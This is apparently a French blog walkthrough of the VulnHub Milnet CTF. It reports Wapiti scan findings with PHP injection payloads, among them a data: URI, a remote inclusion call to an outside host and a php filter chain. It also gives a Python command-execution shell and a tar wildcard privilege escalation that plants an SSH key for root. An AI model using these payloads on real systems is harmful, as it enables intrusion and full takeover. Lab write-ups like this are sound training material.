---
title: "Solution du CTF Milnet de VulnHub"
tags: [CTF,VulnHub]
---

[Milnet](https://vulnhub.com/entry/milnet-1,148/) est un CTF qui aurait sans doute dû me prendre plus de temps à résoudre que ça, mais `Wapiti` disposait de payloads solides pour trouver la vulnérabilité permettant de mettre un pied dans la porte.

NB : La VM fonctionne avec VMWare mais semble bloquer avec VirtualBox.

La VM dispose de deux ports ouverts, SSH et *lighttpd*.

Sur ce dernier, on trouve un site minimaliste qui utilise PHP et des frames. Ni une ni deux je lance `Wapiti` :

```console
$ wapiti -u http://192.168.242.131/ --color

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.1.7 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module sql

[*] Launching module http_headers
Checking X-Frame-Options:
X-Frame-Options is not set
Checking X-Content-Type-Options:
X-Content-Type-Options is not set

[*] Launching module xss

[*] Launching module ssl

[*] Launching module redirect

[*] Launching module exec
---
PHP evaluation in http://192.168.242.131/content.php via injection in the parameter route
Evil request:
    POST /content.php HTTP/1.1
    host: 192.168.242.131
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.242.131/nav.php
    content-length: 75
    Content-Type: application/x-www-form-urlencoded

    route=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
---

[*] Launching module csp
CSP is not set

[*] Launching module file
---
Timeout occurred in http://192.168.242.131/content.php
Evil request:
    POST /content.php HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    route=https%3A%2F%2Fwapiti3.ovh%2Fe.php
---
---
PHP local inclusion leading to code execution in http://192.168.242.131/content.php via injection in the parameter route
Evil request:
    POST /content.php HTTP/1.1
    host: 192.168.242.131
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.242.131/nav.php
    content-length: 4276
    Content-Type: application/x-www-form-urlencoded

    route=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
---
1 requests were skipped due to network issues

[*] Launching module ssrf
1 requests were skipped due to network issues

[*] Launching module cookieflags

[*] Launching module permanentxss

[*] Generating report...
A report has been generated in the file /home/devloop/.wapiti/generated_report
Open /home/devloop/.wapiti/generated_report/192.168.242.131_05222023_1403.html with a browser to see this report.
```

On a donc une exécution de code PHP possible. On verra la cause plus tard.

Le rapport généré nous donne ce one-liner pour reproduire la vulnérabilité :

```bash
curl "http://192.168.242.131/content.php" -e "http://192.168.242.131/nav.php" -d "route=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D"
```

Ça utilise donc le scheme `data:` avec un encodage base64 pour passer du code PHP.

J'écris un semblant de prompt pour encoder les commandes et les envoyer au script :

```python
from urllib.parse import quote
from base64 import b64encode

import requests

def cmd_to_data_scheme(command):
    php_command = f"<?php system('{command}'); ?>".encode(errors="ignore")
    return f"data:;base64,{b64encode(php_command).decode()}"

sess = requests.session()
while True:
    command = input("> ").strip()
    if command == "quit":
        break
    response = sess.post(
        "http://192.168.242.131/content.php",
        data={"route": cmd_to_data_scheme(command)}
    )
    print(response.text.rstrip("a\n"))
```

J'obtiens toujours quelques caractères inutiles dans l'output, mais ça fonctionne :

```console
python3 exploit.py 
> uname -a
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
> pwd
/var/www/html
)�
> ls -al
total 128
drwxr-xr-x 2 www-data www-data  4096 May 22  2016 .
drwxr-xr-x 3 root     root      4096 May 21  2016 ..
-rw-r--r-- 1 root     root     73450 Aug  6  2015 bomb.jpg
-rw-r--r-- 1 root     root      3901 May 21  2016 bomb.php
-rw-r--r-- 1 root     root       124 May 21  2016 content.php
-rw-r--r-- 1 root     root       145 May 21  2016 index.php
-rw-r--r-- 1 www-data www-data    20 May 21  2016 info.php
-rw-r--r-- 1 root     root       109 May 21  2016 main.php
-rw-r--r-- 1 root     root     18260 Jan 22  2012 mj.jpg
-rw-r--r-- 1 root     root       532 May 21  2016 nav.php
-rw-r--r-- 1 root     root       253 May 22  2016 props.php
)�
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Voici le code PHP qui était vulnérable :

```php
<?php
if (isset($_POST['route'])) {
    $route = $_POST['route'];
} else {
    $route = main;
}

include $route . ".php"
?>
```

La technique est mentionnée sur [File Inclusion/Path traversal - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#data).

La seconde technique trouvée par `Wapiti` consiste à se servir d'un payload de type [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator). Comme `Wapiti` ajoute un point d'interrogation à la fin de son payload, l'ajout de l'extension finale n'a aucune incidence.

Une fois sur le système je trouve un dossier particulier à la racine :

```console
www-data@seckenheim:/$ ls backup/
total 3.7M
drwxr-xr-x  2 root root 4.0K May 21  2016 .
drwxr-xr-x 24 root root 4.0K May 21  2016 ..
-rw-r--r-x  1 root root   57 May 21  2016 backup.sh
-rw-r--r--  1 root root 3.7M May 22 18:20 backup.tgz
www-data@seckenheim:/$ date
Mon May 22 18:20:46 CEST 2023
```

L'archive semble avoir été créée récemment, sans doute via une tache cron. Le script shell dans le même dossier est visiblement responsable de la création :

```bash
#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
```

On peut voir que le script utilise le symbole wildcard ce qui rend la commande vulnérable à une injection d'options.

On va procéder comme pour le [CTF /dev/random: Pipe]({% link _posts/2017-11-17-Solution-du-CTF-devrandom-Pipe-de-VulnHub.md %}) qui avait le même scénario. On va placer un script `evil.sh` qui rajoute une clé SSH autorisée pour le compte root puis créer des noms de fichiers qui seront pris comme des options par la commande `tar` et permettront de faire exécuter notre script :

```console
www-data@seckenheim:/var/www/html$ vi evil.sh
www-data@seckenheim:/var/www/html$ cat evil.sh 
#!/bin/bash
mkdir -p /root/.ssh/
echo "ssh-rsa AAAA--- snip clé publique ssh snip ---z8/h" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
www-data@seckenheim:/var/www/html$ touch -- "--checkpoint=1"; touch -- "--checkpoint-action=exec=sh evil.sh"; touch a
```

Quasiment aussitôt j'obtiens l'accès root :

```console
$ ssh -i ~/.ssh/key_no_pass root@192.168.242.131
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

19 packages can be updated.
0 updates are security updates.


Last login: Sun May 22 21:04:14 2016 from 192.168.0.79
root@seckenheim:~# id
uid=0(root) gid=0(root) groups=0(root)
root@seckenheim:~# cd /root
root@seckenheim:~# ls
credits.txt
root@seckenheim:~# cat credits.txt 
        ,----,                                                               
      ,/   .`|                                                               
    ,`   .'  :  ,---,                          ,---,.                        
  ;    ;     /,--.' |                        ,'  .' |                  ,---, 
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'| 
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | : 
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | | 
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| | 
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
              `--''       \   \  /         |   | ,'  '---'        \   \  /   
                           `----'          `----'                  `----'    
                                                                             

This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...

This VM was inspired by The Cuckoo's Egg. 
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
```
